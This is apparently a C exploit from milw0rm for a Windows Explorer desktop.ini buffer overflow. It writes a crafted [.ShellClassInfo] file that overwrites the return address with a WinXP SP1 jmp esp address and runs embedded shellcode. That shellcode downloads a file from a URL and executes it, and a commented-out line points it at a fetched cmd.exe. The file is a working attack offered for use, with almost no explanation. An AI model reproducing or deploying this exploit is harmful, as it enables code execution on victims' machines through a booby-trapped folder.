#include <fstream.h>
#include <string.h>
#include <stdio.h>
#include <windows.h>
#include <direct.h>

char shellcode[]=
//download url and exec shellcode
//doesn't have any hardcoded values
//except the base address of the program
//searches the import table for 
//LoadLibraryA, GetProcAddress and ExitProcess.
//by .einstein., dH team.
  "\x81\xec\x40\x1f\x00\x00\xe8\x00\x00\x00\x00\x5d\x83\xed\x0b\xbf\x61\x57" 
  "\x7a\x74\xe8\x8c\x00\x00\x00\x89\xbd\x17\x01\x00\x00\xbf\x65\x1d\x22\x74" 
  "\xe8\x7c\x00\x00\x00\x89\xbd\x1b\x01\x00\x00\xbf\x17\x75\x79\x70\xe8\x6c" 
  "\x00\x00\x00\x89\xbd\x1f\x01\x00\x00\x8d\x85\x2c\x01\x00\x00\x50\x2e\xff" 
  "\x95\x17\x01\x00\x00\x8d\x9d\x33\x01\x00\x00\x53\x50\x2e\xff\x95\x1b\x01" 
  "\x00\x00\x6a\x00\x6a\x00\x8d\x8d\x4e\x01\x00\x00\x51\x8d\x8d\x5c\x01\x00" 
  "\x00\x51\x6a\x00\xff\xd0\x8d\x85\x23\x01\x00\x00\x50\x2e\xff\x95\x17\x01" 
  "\x00\x00\x8d\x9d\x46\x01\x00\x00\x53\x50\x2e\x8b\x9d\x1b\x01\x00\x00\xff" 
  "\xd3\x6a\x01\x8d\x8d\x4e\x01\x00\x00\x51\xff\xd0\x6a\x00\x2e\xff\x95\x1f" 
  "\x01\x00\x00\xbb\x3c\x00\x00\x01\x8b\x0b\x81\xc1\x04\x00\x00\x01\x8d\x41" 
  "\x14\x8b\x70\x68\x81\xc6\x00\x00\x00\x01\x8b\x06\x83\xf8\x00\x74\x51\x05" 
  "\x00\x00\x00\x01\x8b\x56\x10\x81\xc2\x00\x00\x00\x01\x8b\x18\x8b\xcb\x81" 
  "\xe1\x00\x00\x00\x80\x83\xf9\x00\x75\x2a\x81\xc3\x00\x00\x00\x01\x83\xc3" 
  "\x02\x33\xc9\x32\x0b\xc1\xc1\x08\x43\x80\x3b\x00\x75\xf5\x3b\xcf\x75\x04" 
  "\x8b\x3a\xeb\x16\x83\xc2\x04\x83\xc0\x04\x66\x83\x38\x00\x75\xc7\x83\xc6" 
  "\x14\x8b\x10\x83\xfa\x00\x74\xa8\xc3\x00\x00\x00\x00\x00\x00\x00\x00\x00" 
  "\x00\x00\x00\x4b\x45\x52\x4e\x45\x4c\x33\x32\x00\x55\x52\x4c\x4d\x4f\x4e" 
  "\x00\x55\x52\x4c\x44\x6f\x77\x6e\x6c\x6f\x61\x64\x54\x6f\x46\x69\x6c\x65" 
  "\x41\x00\x57\x69\x6e\x45\x78\x65\x63\x00\x5c\x7e\x57\x52\x46\x35\x36\x33" 
  "\x34\x2e\x74\x6d\x70\x00";

char unicode_header[] = "\xFF\xFE";
char shell_header[] = "[.ShellClassInfo]\x0d\x0a";

#define OVERFLOW_LEN 0xA1C


void main()
{
  char url[]="file://c:/winnt/system32/calc.exe";
 // char url[]="http://localhost/cmd.exe";
  char eip[] = "\xcc\x59\xfb\x77"; //0x77fb59cc - WinXP SP1 ntdll.dll (jmp esp)


  char path[500]; 
  strcpy(path,"domain HELL team");
  mkdir(path);
  SetFileAttributes(path,FILE_ATTRIBUTE_READONLY);
  strcat(path,"\\desktop.ini");

  ofstream out(path,ios::out+ios::binary);
  out.write(unicode_header,sizeof(unicode_header)-1);
  char zero = 0;
  for (int i=0;i<strlen(shell_header);i++)
  {
    out.write(&shell_header[i],1);
    out.write(&zero,1);
  }
  char pad = 'B';
  for (i=0;i<OVERFLOW_LEN;i++) out.write(&pad,1);
  char ebp[] = "1234";
  out.write(ebp,4);

  char pad0 = 1;

  out.write(eip,4);

  char pad2 = 'C';
  for (i=0;i<12;i++) out.write(&pad,1);
 

  out.write(shellcode,sizeof(shellcode)-1);
  out.write(url,sizeof(url));
 
  int len = sizeof(shellcode)-1+sizeof(url);
  printf("shellcode+url: %d bytes\n",len);
  if (len%2 == 1) 
  {
    printf("it's odd, so add 1 extra byte");
    out.write(&pad2,1);
  }
 
  out.close();

}



// milw0rm.com [2003-05-21]
